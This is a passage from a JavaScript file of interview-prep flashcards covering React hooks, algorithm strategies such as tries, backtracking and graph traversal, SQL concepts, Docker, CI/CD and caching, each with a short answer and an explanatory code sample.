  return isValidBST(root.left, min, root.val) && 
         isValidBST(root.right, root.val, max);
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-10",
          q: "Kth Smallest Element in a BST?",
          hint: "Inorder traversal gives sorted order.",
          answer: "Perform an inorder traversal (Left, Root, Right). Keep a counter. When counter equals K, the current node is the Kth smallest element.",
          code: `function kthSmallest(root, k) {
  let count = 0, result = null;
  
  function inorder(node) {
    if (!node || result !== null) return; // Stop early if found
    
    inorder(node.left); // Process left (smallest)
    
    count++; // Process current node
    if (count === k) {
      result = node.val;
      return;
    }
    
    inorder(node.right); // Process right (larger)
  }
  
  inorder(root);
  return result;
}`,
          category: "DSA",
          language: "javascript"
        }
      ];
    case 16:
      return [
        {
          id: "lf-p16-1",
          q: "How to handle an API failure gracefully in React?",
          hint: "try/catch, set error state, show fallback UI.",
          answer: "Use try/catch in the async fetch function. On catch, set an error state. In the render, if error state exists, show an error message instead of crashing.",
          code: `const [data, setData] = useState(null);
const [error, setError] = useState('');

useEffect(() => {
  const fetchData = async () => {
    try {
      const res = await fetch('/api/data');
      if (!res.ok) throw new Error('Failed to fetch');
      setData(await res.json()); // Success path
    } catch (err) {
      setError(err.message);     // Failure path
    }
  };
  fetchData();
}, []);

// Render based on state
if (error) return <div>Error: {error}</div>;
if (!data) return <div>Loading...</div>;
return <div>{data.name}</div>;`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-2",
          q: "What is `React.memo`?",
          hint: "HOC for memoizing components.",
          answer: "A higher-order component that prevents functional components from re-rendering if their props have not changed (shallow comparison).",
          code: `import React from 'react';

// React.memo wraps the component
// It skips re-rendering if 'text' and 'onClick' references haven't changed
const Button = React.memo(({ text, onClick }) => {
  console.log('Button rendered');
  return <button onClick={onClick}>{text}</button>;
});

export default Button;`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-3",
          q: "What is `useMemo`?",
          hint: "Caches the result of an expensive calculation.",
          answer: "A hook that memoizes the RESULT of an expensive function so it is only re-calculated when its dependencies change.",
          code: `import { useMemo } from 'react';

function Component({ items }) {
  // useMemo caches the RESULT of the calculation
  // It only runs again if the 'items' array changes
  const totalValue = useMemo(() => {
    console.log('Calculating total...');
    return items.reduce((sum, item) => sum + item.value, 0);
  }, [items]);

  return <div>Total: {totalValue}</div>;
}`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-4",
          q: "What is `useCallback`?",
          hint: "Caches a function definition.",
          answer: "A hook that returns a memoized VERSION of a function, useful for passing stable callbacks to optimized child components to prevent unnecessary re-renders.",
          code: `import { useCallback, useState } from 'react';
import MemoizedChild from './Child';

function Parent() {
  const [count, setCount] = useState(0);

  // useCallback caches the FUNCTION DEFINITION
  // Reference stays identical across Parent re-renders
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // Empty deps: function never changes

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      {/* MemoizedChild won't re-render since handleClick reference is stable */}
      <MemoizedChild onClick={handleClick} />
    </div>
  );
}`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-5",
          q: "When should you NOT use `useMemo` or `useCallback`?",
          hint: "When the overhead costs more than the render.",
          answer: "Don't use them prematurely. The hooks themselves carry memory and performance overhead. Only use them for expensive computations or when passing props to heavily memoized children.",
          code: `// BAD: Unnecessary useMemo for a fast calculation (overhead > benefit)
const value = useMemo(() => a + b, [a, b]);

// GOOD: Just calculate it directly during render
const value2 = a + b;

// BAD: useCallback on an element that isn't React.memo()
// <button> is native DOM, it re-renders anytime Parent renders anyway!
const log = useCallback(() => console.log(a), [a]);
return <button onClick={log}>Click</button>;`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-6",
          q: "What is the Virtual DOM?",
          hint: "A lightweight JS copy of the real DOM.",
          answer: "An in-memory representation of the actual DOM. React updates the Virtual DOM first, compares it with the previous version (Diffing), and then selectively updates only the changed nodes in the real DOM (Reconciliation).",
          code: `// Virtual DOM Flow Conceptually:
// 1. State changes: setCount(1)
// 2. React builds a NEW Virtual DOM tree in memory.
// 3. Diffing Phase: React compares New V-DOM vs Old V-DOM.
// 4. React finds the exact differences (e.g., text node '0' to '1').
// 5. Reconciliation: React applies ONLY those changes to the real DOM.
// Result: Much faster than replacing the entire real DOM tree.`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-7",
          q: "Why do we need 'keys' in React Lists?",
          hint: "Helps React identify which items changed.",
          answer: "Keys help React's reconciliation process identify which items have changed, been added, or been removed. Using index as a key can cause bugs if the list order changes.",
          code: `// Good: Using a unique, stable ID
{todos.map(todo => (
  <li key={todo.id}>{todo.text}</li>
))}

// Bad: Using array index
// If items are reordered or deleted, index changes!
// This causes React to misidentify items and can lead to UI bugs.
{todos.map((todo, index) => (
  <li key={index}>{todo.text}</li>
))}`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-8",
          q: "Controlled vs Uncontrolled components?",
          hint: "State driven vs DOM driven.",
          answer: "Controlled components derive their value from React state (e.g., `value={state} onChange={handleChange}`). Uncontrolled components maintain their own state in the DOM (accessed via `useRef()`).",
          code: `// Controlled Component: React state acts as the "single source of truth"
const [val, setVal] = useState('');
<input value={val} onChange={e => setVal(e.target.value)} />

// Uncontrolled Component: The DOM element manages its own internal state
const inputRef = useRef(null);
const handleSubmit = () => {
  console.log(inputRef.current.value); // Read directly from DOM
};
<input ref={inputRef} />`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-9",
          q: "What is Prop Drilling?",
          hint: "Passing props through many intermediate components.",
          answer: "The process of passing data from a top-level component down to deeply nested components through multiple intermediaries that don't need the data themselves. Solved by Context API or Redux.",
          code: `// Prop Drilling Example:
// App (holds theme state)
//  -> Layout (receives theme just to pass it down)
//      -> Header (receives theme just to pass it down)
//          -> Button (finally actually uses theme)

// Solution: React Context API or Redux
// Provider wraps the App. Button uses 'useContext(ThemeContext)' 
// to read the theme directly, bypassing Layout and Header entirely.`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p16-10",
          q: "Clone Graph: Strategy?",
          hint: "DFS/BFS + HashMap to map old nodes to new.",
          answer: "Use a HashMap where keys are original nodes and values are the new clones. Traverse via DFS/BFS. If node is in map, return clone. Else, create clone, put in map, and recursively clone neighbors.",
          code: `function cloneGraph(node, map = new Map()) {
  if (!node) return null;
  // If we've already cloned this node, return its clone to avoid infinite loops
  if (map.has(node)) return map.get(node);
  
  // Create clone and store in map
  const clone = new _Node(node.val);
  map.set(node, clone);
  
  // Recursively clone neighbors
  for (const neighbor of node.neighbors) {
    clone.neighbors.push(cloneGraph(neighbor, map));
  }
  return clone;
}`,
          category: "DSA",
          language: "javascript"
        }
      ];
    case 17:
      return [
        {
          id: "lf-p17-1",
          q: "Number of Islands: Strategy?",
          hint: "Grid DFS/BFS.",
          answer: "Iterate through the grid. When you find a '1' (land), increment the island count, then launch a DFS/BFS to mark all connected '1's as '0' (visited) so they aren't counted again.",
          code: `function numIslands(grid) {
  let count = 0;
  for (let r = 0; r < grid.length; r++) {
    for (let c = 0; c < grid[0].length; c++) {
      if (grid[r][c] === '1') {
        count++; // Found a new island
        dfs(grid, r, c); // Sink the entire island
      }
    }
  }
  return count;
}

function dfs(grid, r, c) {
  // Check bounds and if it's water ('0')
  if (r < 0 || c < 0 || r >= grid.length || c >= grid[0].length || grid[r][c] === '0') return;
  grid[r][c] = '0'; // Sink island part
  // Visit all 4 neighbors
  dfs(grid, r-1, c); dfs(grid, r+1, c); 
  dfs(grid, r, c-1); dfs(grid, r, c+1);
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p17-2",
          q: "Course Schedule: Strategy?",
          hint: "Topological Sort / Detect cycle in directed graph.",
          answer: "Build an adjacency list and an in-degree array. Use Kahn's Algorithm (BFS): push nodes with 0 in-degree to a queue. Pop, process neighbors by reducing their in-degree. If reduced to 0, push to queue. If processed nodes == total courses, return true.",
          code: `function canFinish(numCourses, prerequisites) {
  const adj = Array.from({length: numCourses}, () => []);
  const inDegree = Array(numCourses).fill(0);
  
  // Build graph and in-degree array
  for (const [course, prereq] of prerequisites) {
    adj[prereq].push(course);
    inDegree[course]++;
  }
  
  // Queue courses with no prerequisites
  const queue = [];
  for (let i = 0; i < numCourses; i++) {
    if (inDegree[i] === 0) queue.push(i);
  }
  
  let count = 0;
  // Kahn's Algorithm BFS
  while (queue.length) {
    const curr = queue.shift();
    count++; // We took a course
    for (const neighbor of adj[curr]) {
      inDegree[neighbor]--; // Prereq completed
      if (inDegree[neighbor] === 0) queue.push(neighbor);
    }
  }
  return count === numCourses; // True if all courses taken
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p17-3",
          q: "Graph representations: Adjacency Matrix vs List?",
          hint: "Dense vs Sparse graphs.",
          answer: "Matrix: 2D array, fast O(1) edge lookup, takes O(V²) space. List: Array of lists, slower edge lookup, takes O(V+E) space. List is preferred for sparse graphs (few edges).",
          code: `// Adjacency Matrix (Dense graph)
// 1 = connected, 0 = not connected
const matrix = [
  [0, 1], 
  [1, 0]
];

// Adjacency List (Sparse graph)
// Array index is node, sub-array holds connected nodes
const list = [
  [1], 
  [0]
];`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-4",
          q: "What is a Trie (Prefix Tree)?",
          hint: "Tree optimized for string prefixes.",
          answer: "A tree data structure used to efficiently store and retrieve keys in a dataset of strings. Highly optimized for prefix searches (e.g., autocomplete, spell checker).",
          code: `class TrieNode {
  constructor() {
    this.children = {}; // Stores next characters
    this.isEndOfWord = false; // Marks a complete word
  }
}
// Insert 'cat':
// root -> 'c' (node) -> 'a' (node) -> 't' (node, isEndOfWord=true)`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-5",
          q: "Implement Trie (Prefix Tree): Insert and Search?",
          hint: "Traverse characters, create nodes if missing.",
          answer: "Insert: Iterate chars, create child nodes if they don't exist. Mark last node `isEnd`. Search: Iterate chars, return false if child doesn't exist. Return `isEnd` at the end.",
          code: `class Trie {
  constructor() { this.root = {}; }
  insert(word) {
    let node = this.root;
    for (const char of word) {
      if (!node[char]) node[char] = {}; // Create if missing
      node = node[char];
    }
    node.isEnd = true; // Mark end
  }
  search(word) {
    let node = this.root;
    for (const char of word) {
      if (!node[char]) return false; // Path broke
      node = node[char];
    }
    return !!node.isEnd; // Valid if marked as end
  }
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p17-6",
          q: "What is the primary difference between SQL and NoSQL?",
          hint: "Relational/Schema vs Document/Flexible.",
          answer: "SQL is relational, uses tables, enforces strict schemas, and scales vertically. NoSQL is non-relational (documents, key-value), flexible schemas, and designed to scale horizontally.",
          code: `// SQL (Strict Schema, Structured into Rows/Columns):
// CREATE TABLE Users (id INT, name VARCHAR);
// INSERT INTO Users VALUES (1, 'Alice');

// NoSQL / MongoDB (Flexible JSON Documents):
// db.users.insert({ 
//   _id: 1, 
//   name: 'Alice', 
//   age: 25, 
//   tags: ['dev'] // Arrays and nested objects allowed
// });`,
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-7",
          q: "What is ACID in databases?",
          hint: "Transactions properties.",
          answer: "Properties ensuring reliable database transactions. Atomicity (all or nothing), Consistency (valid state), Isolation (concurrent safe), Durability (saved permanently).",
          code: `// Atomicity example: Bank Transfer
// BEGIN TRANSACTION;
// UPDATE checking SET balance = balance - 100;
// UPDATE savings SET balance = balance + 100;
// COMMIT;

// If the server crashes between the two updates, 
// the entire transaction rolls back automatically (All or nothing).`,
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-8",
          q: "What is Database Normalization?",
          hint: "Reducing redundancy.",
          answer: "The process of structuring a relational database to reduce data redundancy and improve data integrity by dividing larger tables into smaller ones and linking them using relationships.",
          code: `// Unnormalized (Data Redundancy):
// Orders: [OrderID, Item, CustomerName, CustomerAddress]
// If Alice orders 5 times, her address is saved 5 times!

// Normalized (Efficient):
// Customers: [CustomerID, Name, Address]
// Orders: [OrderID, Item, CustomerID]
// Uses a Foreign Key to link to Customers table.`,
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-9",
          q: "SQL Left Join vs Inner Join?",
          hint: "All left rows vs only matching rows.",
          answer: "Inner Join returns only rows where there is a match in BOTH tables. Left Join returns ALL rows from the left table, and matched rows from the right (or NULL if no match).",
          code: `// INNER JOIN: Only users who HAVE orders are returned.
// SELECT Users.name, Orders.date FROM Users 
// INNER JOIN Orders ON Users.id = Orders.user_id;

// LEFT JOIN: ALL users are returned. 
// If they have no orders, the 'date' column will be NULL.
// SELECT Users.name, Orders.date FROM Users 
// LEFT JOIN Orders ON Users.id = Orders.user_id;`,
          category: "Database Theory",
          language: "javascript"
        },
        {
          id: "lf-p17-10",
          q: "What are Database Indexes?",
          hint: "Book index for faster reads.",
          answer: "Data structures that improve the speed of data retrieval operations on a database table at the cost of additional storage space and slower writes (INSERT/UPDATE).",
          code: `// Slow query (Linear Scan O(n)):
// SELECT * FROM Users WHERE email = 'test@test.com';

// Create an index on the email column:
// CREATE INDEX idx_email ON Users(email);

// Now the DB uses a B-Tree data structure internally
// to find the email in O(log n) time. Very fast!`,
          category: "Database Theory",
          language: "javascript"
        }
      ];
    case 18:
      return [
        {
          id: "lf-p18-1",
          q: "Word Search: Strategy?",
          hint: "Backtracking (DFS).",
          answer: "Iterate through the grid. If a cell matches the first letter, start a DFS. In DFS, temporarily mark the cell as visited (e.g., change to '#'), recurse in 4 directions, then unmark it (backtrack).",
          code: `function exist(board, word) {
  for (let r = 0; r < board.length; r++) {
    for (let c = 0; c < board[0].length; c++) {
      // Start DFS if first letter matches
      if (dfs(board, r, c, 0, word)) return true;
    }
  }
  return false;
}

function dfs(board, r, c, i, word) {
  if (i === word.length) return true; // Found all letters
  
  // Check boundaries and if current cell matches the letter
  if (r < 0 || c < 0 || r >= board.length || c >= board[0].length || board[r][c] !== word[i]) {
    return false;
  }
  
  const temp = board[r][c];
  board[r][c] = '#'; // Mark as visited to prevent reusing cell
  
  // Recurse in all 4 directions
  const found = dfs(board, r+1, c, i+1, word) || dfs(board, r-1, c, i+1, word) || 
                dfs(board, r, c+1, i+1, word) || dfs(board, r, c-1, i+1, word);
                
  board[r][c] = temp; // Backtrack: restore cell for other paths
  return found;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-2",
          q: "Permutations: Strategy?",
          hint: "Backtracking with a visited array or filtering.",
          answer: "Use backtracking. Build an array by adding unused numbers. When the built array length equals the input length, add a copy to results. Loop through choices, pick one, recurse, backtrack.",
          code: `function permute(nums) {
  const res = [];
  
  function backtrack(path, used) {
    // Goal reached: path is full length
    if (path.length === nums.length) {
      res.push([...path]); // Store copy
      return;
    }
    
    // Explore choices
    for (let i = 0; i < nums.length; i++) {
      if (used[i]) continue; // Skip already used numbers
      
      used[i] = true;
      path.push(nums[i]); // Make choice
      
      backtrack(path, used); // Recurse
      
      path.pop(); // Undo choice (Backtrack)
      used[i] = false; // Undo choice (Backtrack)
    }
  }
  
  backtrack([], []);
  return res;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-3",
          q: "Subsets: Strategy?",
          hint: "Include or Exclude element.",
          answer: "Backtracking. At each element, make two recursive calls: one where you INCLUDE the element in the current subset, and one where you EXCLUDE it.",
          code: `function subsets(nums) {
  const res = [];
  
  function backtrack(index, current) {
    if (index === nums.length) {
      res.push([...current]); // Store copy of subset
      return;
    }
    
    // Option 1: Include the current element
    current.push(nums[index]);
    backtrack(index + 1, current);
    current.pop(); // Backtrack
    
    // Option 2: Exclude the current element
    backtrack(index + 1, current);
  }
  
  backtrack(0, []);
  return res;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-4",
          q: "Combination Sum: Strategy?",
          hint: "Backtrack, allow reusing same index.",
          answer: "Backtrack. Keep track of current sum. If sum == target, record. If sum > target, return. Recurse by looping from current index (to allow reusing the same coin) up to end.",
          code: `function combinationSum(candidates, target) {
  const res = [];
  
  function backtrack(index, currentPath, currentSum) {
    if (currentSum === target) return res.push([...currentPath]); // Goal
    if (currentSum > target) return; // Exceeded target, stop exploring
    
    for (let i = index; i < candidates.length; i++) {
      currentPath.push(candidates[i]);
      
      // Pass 'i' instead of 'i+1' because we can reuse the same element!
      backtrack(i, currentPath, currentSum + candidates[i]);
      
      currentPath.pop(); // Backtrack
    }
  }
  
  backtrack(0, [], 0);
  return res;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p18-5",
          q: "What is Backtracking?",
          hint: "Build solution incrementally, abandon if invalid.",
          answer: "An algorithmic technique for finding all (or some) solutions by building them incrementally, and abandoning a path ('backtracking') as soon as it determines the path cannot lead to a valid solution.",
          code: `// Backtracking General Template:
function backtrack(state) {
  if (isGoal(state)) return addSolution(state);
  
  for (const choice of getChoices(state)) {
    if (isValid(choice)) {
      makeChoice(state, choice);
      
      backtrack(state); // Recurse deeper
      
      undoChoice(state, choice); // THIS is the backtrack step!
    }
  }
}`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-6",
          q: "What does `Array.prototype.flat()` do?",
          hint: "Flattens nested arrays.",
          answer: "Creates a new array with all sub-array elements concatenated into it recursively up to the specified depth (default 1).",
          code: `const arr = [1, 2, [3, 4, [5, 6]]];

console.log(arr.flat());         // [1, 2, 3, 4, [5, 6]] (flattens depth 1 by default)
console.log(arr.flat(2));        // [1, 2, 3, 4, 5, 6]   (flattens up to depth 2)
console.log(arr.flat(Infinity)); // Flattens completely regardless of nesting depth`,
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-7",
          q: "Difference between `==` and `===`?",
          hint: "Type coercion.",
          answer: "`==` compares values after attempting type coercion (converting them to the same type). `===` strictly compares both value AND type. Always use `===`.",
          code: `console.log(5 == '5');  // true (string '5' coerced to number 5)
console.log(5 === '5'); // false (different types: number vs string)

console.log(0 == false);  // true (false coerced to 0)
console.log(0 === false); // false (different types)

console.log(null == undefined);  // true (special rule in JS)
console.log(null === undefined); // false`,
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-8",
          q: "What is a Symbol in JavaScript?",
          hint: "Unique and immutable primitive.",
          answer: "A primitive data type introduced in ES6. Every Symbol is unique. Often used to add hidden, non-enumerable properties to objects to prevent naming collisions.",
          code: `const sym1 = Symbol('id');
const sym2 = Symbol('id');
console.log(sym1 === sym2); // false (every Symbol is guaranteed unique)

const obj = {};
obj[sym1] = 'hidden value';

// Symbols are not visible in normal object iteration:
console.log(Object.keys(obj)); // []

// But they are accessible if you have the exact symbol reference:
console.log(obj[sym1]); // 'hidden value'`,
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-9",
          q: "What are Generator functions?",
          hint: "Functions that can be paused and resumed (`yield`).",
          answer: "Functions written with `function*` that can be paused mid-execution and resumed later. They use `yield` to return multiple values one at a time via an Iterator.",
          code: `function* idMaker() {
  let id = 1;
  while (id <= 3) {
    yield id++; // Pauses execution and returns the value
  }
}

const gen = idMaker(); // Creates an Iterator
console.log(gen.next().value); // 1
console.log(gen.next().value); // 2
console.log(gen.next().value); // 3
console.log(gen.next().done);  // true (no more values to yield)`,
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p18-10",
          q: "How does `this` behave in a regular function vs arrow function in a class?",
          hint: "Dynamic vs Lexical.",
          answer: "In a class method, regular functions lose `this` if passed as callbacks (unless bound). Arrow functions lexically bind `this` to the class instance.",
          code: `class Button {
  constructor() { this.name = 'Btn'; }
  
  regularClick() { console.log(this.name); }
  arrowClick = () => { console.log(this.name); }
}

const btn = new Button();
const reg = btn.regularClick; // Extracts function
const arr = btn.arrowClick;   // Extracts arrow function

// reg(); // TypeError: Cannot read property 'name' of undefined (lost 'this')
arr(); // 'Btn' (Arrow functions lexically preserve 'this' from where they were defined)`,
          category: "JS Theory",
          language: "javascript"
        }
      ];
    case 19:
      return [
        {
          id: "lf-p19-1",
          q: "Merge K Sorted Lists: Strategy?",
          hint: "Min-Heap or Divide and Conquer.",
          answer: "Optimal: Min-Heap (Priority Queue) to always pull the smallest node across all K lists. Alternative (JavaScript friendly): Divide and Conquer, merging lists in pairs until 1 remains.",
          code: `// Divide and Conquer Approach
function mergeKLists(lists) {
  if (!lists.length) return null;
  
  // Keep merging pairs of lists until only 1 giant sorted list remains
  while (lists.length > 1) {
    const a = lists.shift(); // Take first list
    const b = lists.shift(); // Take second list
    
    const merged = mergeTwoLists(a, b); // (Uses helper from Day 14)
    lists.push(merged); // Put the merged list back at the end
  }
  
  return lists[0]; // The final sorted list
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-2",
          q: "Find Median from Data Stream: Strategy?",
          hint: "Two Heaps (Max-Heap for lower half, Min-Heap for upper).",
          answer: "Maintain two heaps. A Max-Heap for the smaller half of numbers, a Min-Heap for the larger half. Keep their sizes balanced (difference max 1). Median is the root of the larger heap, or average of both roots.",
          code: `// Conceptual logic (JavaScript doesn't have native Heaps built-in)
class MedianFinder {
  constructor() {
    // this.low = MaxHeap (stores the smaller half of numbers)
    // this.high = MinHeap (stores the larger half of numbers)
  }
  
  addNum(num) {
    this.low.push(num);
    this.high.push(this.low.popMax()); // Balance the values
    
    // Maintain size property: 'low' can have at most 1 more element than 'high'
    if (this.low.size < this.high.size) {
      this.low.push(this.high.popMin());
    }
  }
  
  findMedian() {
    return this.low.size > this.high.size ? 
           this.low.peek() : // Odd total, median is in 'low'
           (this.low.peek() + this.high.peek()) / 2; // Even total, average the two middle values
  }
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-3",
          q: "What is a Heap (Priority Queue)?",
          hint: "Tree-based structure where parent > children.",
          answer: "A complete binary tree where the parent node is greater/smaller than or equal to its children (Max-Heap/Min-Heap). Finding the max/min is O(1), insertions/deletions are O(log n).",
          code: `// Heaps are typically implemented using Arrays to represent a complete binary tree
// Formulas to navigate the implicit tree for any node at 'index':

// Parent index: Math.floor((index - 1) / 2)
// Left child index: 2 * index + 1
// Right child index: 2 * index + 2`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p19-4",
          q: "Trapping Rain Water: Strategy?",
          hint: "Two Pointers or Left/Right Max Arrays.",
          answer: "Two Pointers: Maintain left_max and right_max. If left_max < right_max, process left pointer (water = left_max - height[left], increment left). Else process right pointer.",
          code: `function trap(height) {
  let left = 0, right = height.length - 1;
  let leftMax = 0, rightMax = 0, water = 0;
  
  while (left < right) {
    // Process the side with the smaller height bound
    if (height[left] < height[right]) {
      // If current is taller than leftMax, update leftMax
      // Else, it can trap water equal to (leftMax - current height)
      height[left] >= leftMax ? leftMax = height[left] : water += leftMax - height[left];
      left++;
    } else {
      // Same logic for the right side
      height[right] >= rightMax ? rightMax = height[right] : water += rightMax - height[right];
      right--;
    }
  }
  return water;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-5",
          q: "Serialize and Deserialize Binary Tree?",
          hint: "BFS/DFS to string, split to array to rebuild.",
          answer: "Serialize: Pre-order traversal, append node value, append 'null' for empty. Deserialize: Split string by commas, use shift() on the array to recursively rebuild the tree.",
          code: `const serialize = (root) => {
  if (!root) return 'X,'; // Mark null nodes
  // Pre-order: Root, Left, Right
  return root.val + ',' + serialize(root.left) + serialize(root.right);
};

const deserialize = (data) => {
  const queue = data.split(',');
  
  const buildTree = () => {
    const val = queue.shift();
    if (val === 'X') return null; // Reconstruct null node
    
    const node = new TreeNode(parseInt(val));
    node.left = buildTree(); // Recursively build left
    node.right = buildTree(); // Recursively build right
    return node;
  };
  
  return buildTree();
};`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p19-6",
          q: "What is Dependency Injection?",
          hint: "Passing dependencies rather than creating them inside.",
          answer: "A design pattern where an object receives its dependencies from the outside rather than creating them internally. This makes code more testable and decoupled.",
          code: `// BAD: Tightly coupled. UserService creates its own Database.
// Hard to test because you can't easily replace Database with a mock.
class UserService {
  constructor() { 
    this.db = new Database(); // Hardcoded instantiation
  } 
}

// GOOD: Dependency Injection. UserService expects a database to be provided.
class UserService {
  constructor(database) { 
    this.db = database; // Injected from outside
  } 
}
// Testing is easy: const testService = new UserService(new MockDatabase());`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p19-7",
          q: "What is CI/CD?",
          hint: "Continuous Integration / Continuous Deployment.",
          answer: "CI automatically builds and tests code when pushed to a repo. CD automatically deploys the code to production if tests pass. Reduces bugs and manual deployment errors.",
          code: `// Typical CI/CD Pipeline flow (e.g., using GitHub Actions):

// 1. Developer pushes new code to the 'main' branch.
// 2. Action triggers automatically and spins up a server.
// 3. Action runs 'npm install' to get dependencies.
// 4. Action runs 'npm test'. (This is the CI part - ensuring nothing broke).
// 5. If tests are green, Action builds a new Docker image.
// 6. Action pushes image to AWS/Vercel and deploys it. (This is the CD part).`,
          category: "DevOps",
          language: "javascript"
        },
        {
          id: "lf-p19-8",
          q: "What is Docker?",
          hint: "Containerization.",
          answer: "A tool that packages an application and its dependencies into a standardized unit called a container. It ensures the app runs identically across different environments ('works on my machine').",
          code: `// Example Dockerfile for a Node.js application:

// FROM node:18-alpine     <- Base image (OS + Node)
// WORKDIR /app            <- Set working directory inside container
// COPY package.json .     <- Copy dependency list
// RUN npm install         <- Install dependencies
// COPY . .                <- Copy the rest of the application code
// EXPOSE 3000             <- Document which port the app uses
// CMD ["node", "server.js"] <- Command to run when container starts`,
          category: "DevOps",
          language: "javascript"
        },
        {
          id: "lf-p19-9",
          q: "Load Balancer: What does it do?",
          hint: "Distributes incoming traffic.",
          answer: "It sits in front of multiple backend servers and distributes incoming client requests across them. It prevents any single server from overloading and provides high availability.",
          code: `// Conceptual Request Flow:

// Client makes a request 
//   --> [ Load Balancer ] 
//         |
//         |--> Routes to Server 1 (CPU 80% - Busy, skip)
//         |
//         |--> Routes to Server 2 (CPU 20% - Low load, SEND HERE)
//         |
//         |--> Routes to Server 3 (Offline - Health check failed, avoid)`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p19-10",
          q: "Caching Strategies: Redis vs Local Memory?",
          hint: "Distributed vs Single-node.",
          answer: "Local memory (e.g., variables) is fast but doesn't share state across multiple server instances. Distributed caches (e.g., Redis) sit outside the app, allowing all server instances to read/write shared cached data.",
          code: `// Distributed Cache (Redis) workflow example:
async function getUser(id) {
  // 1. Try to fetch from Redis first (extremely fast memory access)
  const cached = await redis.get(\`user:\${id}\`);
  if (cached) return JSON.parse(cached); // Fast return, bypass DB
  
  // 2. If not in cache (Cache Miss), run the slow DB query
  const user = await db.query(\`SELECT * FROM users WHERE id=?\`, [id]);
  
  // 3. Store the result in Redis so the NEXT request is fast
  await redis.set(\`user:\${id}\`, JSON.stringify(user)); 
  
  return user;
}`,
          category: "System Design",
          language: "javascript"
        }
      ];
    case 20:
      return [
        {
          id: "lf-p20-1",
          q: "What are the common HTTP methods used in REST APIs?",
          hint: "GET, POST, PUT, DELETE, PATCH.",
          answer: "GET (retrieve data), POST (create new data), PUT (replace data completely), PATCH (update data partially), DELETE (remove data).",
          code: `// Fetch API Examples for REST HTTP Methods

// GET: Retrieve a list of users (Read)
fetch('/api/users');

// POST: Send new data to the server (Create)
fetch('/api/users', { 
  method: 'POST', 
  body: JSON.stringify({name: 'A'}) 
});

// PATCH: Update specific fields of an existing resource (Update partially)
fetch('/api/users/1', { 
  method: 'PATCH', 
  body: JSON.stringify({name: 'B'}) 
});

// DELETE: Remove a resource (Delete)
fetch('/api/users/1', { method: 'DELETE' });`,
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p20-2",
          q: "What is an Index in a Database?",
          hint: "Speeds up data retrieval.",
          answer: "An index is a data structure (like a B-Tree) that improves the speed of data retrieval operations on a database table, at the cost of additional storage and slightly slower writes.",
          code: `-- SQL Example

-- Problem: Searching by email takes too long (Linear Scan O(n))
-- SELECT * FROM Users WHERE email = 'bob@example.com';

-- Solution: Create an index on the 'email' column
CREATE INDEX idx_users_email ON Users(email);

-- Result: The database builds a B-Tree structure for emails.
-- Now, searching by email is extremely fast (O(log n))`,
          category: "Database Theory",
          language: "sql"
        },
        {
          id: "lf-p20-3",
          q: "What is the difference between Authentication and Authorization?",
          hint: "Who you are vs what you can do.",
          answer: "Authentication verifies WHO a user is (e.g., logging in with a password). Authorization determines WHAT the authenticated user is allowed to do (e.g., admin vs regular user permissions).",
          code: `// Conceptual Express.js Example

// 1. Authentication: Checking WHO the user is
// Is this token valid? Are they logged in?
if (!isValidUser(req.token)) {
  return res.status(401).send('Who are you? (401 Unauthorized)');
}

// 2. Authorization: Checking WHAT they are allowed to do
// They are logged in, but are they an Admin?
if (req.user.role !== 'admin') {
  return res.status(403).send('Not allowed! (403 Forbidden)');
}`,
          category: "Security",
          language: "javascript"
        },
        {
          id: "lf-p20-4",
          q: "What is a Foreign Key?",
          hint: "Links two tables together.",
          answer: "A Foreign Key is a column (or group of columns) in one table that refers to the Primary Key in another table. It enforces referential integrity.",
          code: `-- SQL Example

CREATE TABLE Orders (
    OrderID int PRIMARY KEY,
    OrderNumber int NOT NULL,
    
    -- Foreign Key enforces a link to the Persons table
    -- You cannot insert an Order if the PersonID doesn't exist in Persons!
    PersonID int FOREIGN KEY REFERENCES Persons(PersonID)
);`,
          category: "Database Theory",
          language: "sql"
        },
        {
          id: "lf-p20-5",
          q: "Explain MVC Architecture.",
          hint: "Model, View, Controller.",
          answer: "Model: Manages data and business logic. View: UI components that display data. Controller: Handles user input, interacts with Model, and updates View.",
          code: `// Conceptual Node.js / Express MVC Structure:

// Model (user.model.js) 
